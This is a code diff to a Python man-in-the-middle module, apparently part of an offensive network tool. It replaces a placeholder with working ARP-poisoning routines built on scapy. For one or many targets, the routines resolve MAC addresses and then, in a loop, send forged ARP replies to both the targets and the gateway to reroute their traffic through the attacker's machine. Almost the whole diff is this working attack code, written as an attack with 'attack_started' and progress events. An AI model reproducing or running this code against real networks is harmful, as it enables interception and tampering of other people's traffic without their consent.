@@ -73,13 +73,13 @@ class MitmModule(BaseModule):
     # Command Handlers
     
     def handle_poison_all(self, message: Message):
-        """Handle poisoning all ip's"""
+        """Handle poisoning all IPs in the list"""
         self.target_ip_list = message.data.get("target_ips")
 
-        if not self.target_ip:
+        if not self.target_ip_list or len(self.target_ip_list) == 0:
             return {
                 "status": "error", 
-                "message": "Target IP's required"
+                "message": "Target IPs required"
             }
         
         if self.is_poisoning:
@@ -90,14 +90,32 @@ class MitmModule(BaseModule):
             iface.set_adapter_status("managed")
             self.send_event("status_update", {"status": "adapter_mode_changed", "mode": "managed"})
         
+        # Get MAC addresses for all targets
+        print(f"[{self.module_name}] Getting MAC addresses for {len(self.target_ip_list)} targets...")
+        self.target_mac_list = []
+        for target_ip in self.target_ip_list:
+            mac = network.get_mac_address(target_ip)
+            if mac:
+                self.target_mac_list.append(mac)
+                print(f"[{self.module_name}] {target_ip} -> {mac}")
+            else:
+                print(f"[{self.module_name}] Could not get MAC for {target_ip}")
+        
+        if len(self.target_mac_list) == 0:
+            return {
+                "status": "error",
+                "message": "Could not get MAC addresses for any targets"
+            }
+        
         # Start poisoning
         self.is_poisoning = True
-
-        poison_thread = threading.Thread(target=self._poison_worker, daemon=True)
+        poison_thread = threading.Thread(target=self._poison_all_worker, daemon=True)
         poison_thread.start()
         
         return {
             "status": "attack_started",
+            "target_count": len(self.target_ip_list),
+            "targets_with_mac": len(self.target_mac_list)
         }
 
     def handle_poison_selected(self, message: Message):
@@ -162,21 +180,121 @@ class MitmModule(BaseModule):
     def handle_restore(self, message: Message):
         pass
     
+    def _poison_all_worker(self):
+        """Background worker for poisoning multiple targets"""
+        try:
+            self.send_event("attack_status", {
+                "status": "poisoning_all",
+                "target_count": len(self.target_ip_list),
+            })
+            
+            packet_count = 0
+            
+            while self.is_poisoning:
+                # Send ARP poison to each target
+                for i, target_ip in enumerate(self.target_ip_list):
+                    if i < len(self.target_mac_list):
+                        target_mac = self.target_mac_list[i]
+                        
+                        # Poison target (tell target that we are the gateway)
+                        arp_target = scapy.ARP(
+                            op=2,  # ARP reply
+                            pdst=target_ip,
+                            hwdst=target_mac,
+                            psrc=self.gateway_ip,
+                            hwsrc=network.get_adapter_mac(iface.ADAPTER_NAME)
+                        )
+                        scapy.send(arp_target, verbose=False)
+                        
+                        # Poison gateway (tell gateway that we are the target)
+                        arp_gateway = scapy.ARP(
+                            op=2,  # ARP reply
+                            pdst=self.gateway_ip,
+                            hwdst=self.gateway_mac,
+                            psrc=target_ip,
+                            hwsrc=network.get_adapter_mac(iface.ADAPTER_NAME)
+                        )
+                        scapy.send(arp_gateway, verbose=False)
+                        
+                        packet_count += 2
+                
+                # Send progress update every 100 packets
+                if packet_count % 100 == 0:
+                    self.send_event("attack_progress", {
+                        "packets_sent": packet_count,
+                        "targets": len(self.target_ip_list)
+                    })
+                
+                # Small delay to avoid flooding
+                import time
+                time.sleep(2)
+            
+            # Attack stopped
+            self.send_event("attack_stopped", {
+                "total_packets": packet_count
+            })
+            
+        except Exception as e:
+            print(f"[{self.module_name}] Poison error: {e}")
+            self.send_event("attack_error", {"error": str(e)})
+            self.is_poisoning = False
+    
     def _poison_worker(self):
-        """Background worker for ARP poisoning"""
+        """Background worker for poisoning single target"""
         try:
             self.send_event("attack_status", {
                 "status": "poisoning",
                 "target": self.target_ip,
             })
             
-            # TODO: Implement actual ARP poisoning
+            # Get target MAC
+            target_mac = network.get_mac_address(self.target_ip)
+            if not target_mac:
+                self.send_event("attack_error", {"error": "Could not get target MAC address"})
+                self.is_poisoning = False
+                return
+            
+            packet_count = 0
+            
             while self.is_poisoning:
-                arp_response = scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.self_mac)
-                scapy.send(arp_response, verbose=False)
-                print("Sent ARP response")
+                # Poison target (tell target that we are the gateway)
+                arp_target = scapy.ARP(
+                    op=2,
+                    pdst=self.target_ip,
+                    hwdst=target_mac,
+                    psrc=self.gateway_ip,
+                    hwsrc=network.get_adapter_mac(iface.ADAPTER_NAME)
+                )
+                scapy.send(arp_target, verbose=False)
+                
+                # Poison gateway (tell gateway that we are the target)
+                arp_gateway = scapy.ARP(
+                    op=2,
+                    pdst=self.gateway_ip,
+                    hwdst=self.gateway_mac,
+                    psrc=self.target_ip,
+                    hwsrc=network.get_adapter_mac(iface.ADAPTER_NAME)
+                )
+                scapy.send(arp_gateway, verbose=False)
+                
+                packet_count += 2
+                
+                # Send progress
+                if packet_count % 100 == 0:
+                    self.send_event("attack_progress", {
+                        "packets_sent": packet_count,
+                        "target": self.target_ip
+                    })
+                
+                import time
+                time.sleep(2)
+            
+            self.send_event("attack_stopped", {
+                "total_packets": packet_count
+            })
             
         except Exception as e:
+            print(f"[{self.module_name}] Poison error: {e}")
             self.send_event("attack_error", {"error": str(e)})
             self.is_poisoning = False
     
